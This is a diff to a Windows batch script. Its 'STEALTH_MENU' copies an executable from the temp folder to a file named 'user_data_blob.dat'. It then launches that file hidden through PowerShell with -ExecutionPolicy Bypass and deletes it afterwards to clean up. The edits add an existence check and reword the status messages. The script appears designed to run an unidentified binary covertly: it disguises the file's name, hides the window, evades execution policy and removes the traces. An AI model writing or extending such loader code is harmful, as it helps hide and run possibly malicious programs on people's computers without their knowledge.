@@ -77,15 +77,21 @@ goto STEALTH_MENU
 
 :RUN
 cls
-echo [*] Preparing to launch disguised EXE...
+echo [*] Preparing disguised EXE...
 set "DISGUISED_EXE=%temp%\user_data_blob.dat"
 
-:: Copy disguised EXE from GitHub copy
+if not exist "%temp%\CAXVN.exe" (
+    echo [✖] EXE not found. Please run Setup first.
+    pause
+    goto STEALTH_MENU
+)
+
+:: Copy to disguised name
 copy /Y "%temp%\CAXVN.exe" "%DISGUISED_EXE%" >nul 2>&1
 
-echo [*] Running silently...
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden ^
-  -Command "Start-Process -FilePath '%DISGUISED_EXE%' -WindowStyle Hidden"
+echo [*] Running EXE using PowerShell...
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
+ "Start-Process -FilePath '%DISGUISED_EXE%' -WindowStyle Hidden"
 
 echo [*] Waiting for EXE to finish...
 
@@ -101,6 +107,7 @@ del /f /q "%DISGUISED_EXE%" >nul 2>&1
 echo [✓] Cleanup complete.
 pause
 goto STEALTH_MENU
+
 
 
 
